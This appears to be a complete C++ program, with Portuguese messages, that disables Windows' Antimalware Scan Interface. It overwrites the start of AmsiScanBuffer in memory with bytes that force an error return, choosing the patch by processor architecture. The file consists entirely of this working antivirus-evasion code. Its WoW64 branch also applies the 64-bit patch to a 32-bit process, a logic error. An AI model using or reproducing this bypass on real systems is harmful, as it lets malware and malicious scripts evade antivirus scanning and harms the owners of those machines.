#include <Windows.h>
#include <iostream>
#include <vector>

using std::cout;
using std::cerr;
using std::endl;

namespace Patch {
	const std::vector<unsigned char> x64 = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
	const std::vector<unsigned char> x86 = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
}

bool AdamChesterPatchAmsi(const std::vector<unsigned char>& patch)
{
	HMODULE amsiModule = GetModuleHandleA("amsi.dll");
	if (!amsiModule)
	{
		amsiModule = LoadLibraryA("amsi.dll");
		if (!amsiModule)
		{
			cerr << "Falha ao carregar amsi.dll. Erro: " << GetLastError() << endl;
			return false;
		}
	}

	void* amsiScanBufferAddr = GetProcAddress(amsiModule, "AmsiScanBuffer");
	if (!amsiScanBufferAddr)
	{
		cerr << "Falha ao encontrar AmsiScanBuffer. Erro: " << GetLastError() << endl;
		return false;
	}

	cout << "AmsiScanBuffer encontrado em: 0x" << amsiScanBufferAddr << endl;

	DWORD oldProtect = 0;
	if (!VirtualProtect(amsiScanBufferAddr, patch.size(), PAGE_EXECUTE_READWRITE, &oldProtect))
	{
		cerr << "Falha ao alterar proteção da memória. Erro: " << GetLastError() << endl;
		return false;
	}

	SIZE_T bytesWritten = 0;
	if (!WriteProcessMemory(GetCurrentProcess(), amsiScanBufferAddr, patch.data(), patch.size(), &bytesWritten))
	{
		cerr << "Falha ao escrever patch. Erro: " << GetLastError() << endl;
		VirtualProtect(amsiScanBufferAddr, patch.size(), oldProtect, &oldProtect);
		return false;
	}

	DWORD temp = 0;
	VirtualProtect(amsiScanBufferAddr, patch.size(), oldProtect, &temp);

	cout << "Patch aplicado com sucesso! (" << bytesWritten << " bytes escritos)" << endl;
	return true;
}

int main(void)
{
	cout << "Iniciando AMSI Bypass (Adam Chester Patch)..." << endl;

	BOOL isWow64 = FALSE;
	IsWow64Process(GetCurrentProcess(), &isWow64);

	const std::vector<unsigned char>* selectedPatch = nullptr;

	if (isWow64)
	{
		cout << "Processo WoW64 detectado (32-bit em 64-bit)" << endl;
		selectedPatch = &Patch::x64;
	}
	else
	{
		SYSTEM_INFO si;
		GetNativeSystemInfo(&si);
		if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||
			si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64) 
		{
			cout << "Arquitetura x64 detectada" << endl;
			selectedPatch = &Patch::x64;
		}
		else
		{
			cout << "Arquitetura x86 detectada" << endl;
			selectedPatch = &Patch::x86;
		}
	}

	if (!selectedPatch)
	{
		cerr << "Falha ao determinar arquitetura" << endl;
		return 1;
	}

	bool success = AdamChesterPatchAmsi(*selectedPatch);

	if (success)
	{
		cout << "AMSI Bypass concluído com sucesso!" << endl;
		return 0;
	}
	else
	{
		cerr << "AMSI Bypass falhou!" << endl;
		return 1;
	}
}